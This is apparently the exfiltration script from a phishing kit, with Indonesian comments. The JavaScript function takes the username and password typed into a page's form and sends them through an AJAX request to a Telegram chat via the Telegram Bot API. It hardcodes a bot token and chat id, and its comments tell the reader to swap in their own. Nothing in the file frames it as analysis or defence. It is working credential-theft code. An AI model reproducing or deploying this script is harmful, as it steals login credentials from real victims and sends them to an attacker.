function kirimPesan1() 
{
  var logo = document.getElementById('logo');
var user = document.getElementById('user');
var password = document.getElementById('password');
    
    
    var gabungan = logo.value + '%0A𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   :%20' + user.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱   :%20' + password.value;

    var token = '7826896424:AAE6w0wZPAtlo9-vvLRGzk-40UG_uTArZtA'; // Ganti dengan token bot yang kamu buat
    var grup = '7228666759'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}